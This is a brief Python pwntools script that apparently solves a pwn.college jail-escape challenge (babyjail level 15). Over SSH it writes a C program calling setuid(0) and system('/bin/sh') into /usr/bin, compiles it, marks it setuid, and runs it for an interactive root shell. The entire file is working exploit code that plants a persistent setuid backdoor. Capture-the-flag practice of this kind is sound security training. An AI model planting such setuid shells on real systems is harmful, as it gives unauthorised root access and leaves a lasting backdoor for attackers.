from pwn import *
s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key")
p=s.process(["vm","connect"])
sleep(1);p.recv()
p.sendline(b"/challenge/babyjail_level15")
sleep(1);p.recv()
p.sendline(b"""
echo " \
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(){
    setuid(0);
    system(\\\"/bin/sh\\\");
}
" > /usr/bin/evil.c
""")
sleep(1);p.recv()
p.sendline(b"gcc /usr/bin/evil.c -o /usr/bin/evil")
sleep(1);p.recv()
p.sendline(b"chmod +s /usr/bin/evil")
sleep(1);p.recv()
p.sendline(b"exit")
sleep(1);p.recv()
p.sendline(b"/usr/bin/evil")
p.interactive()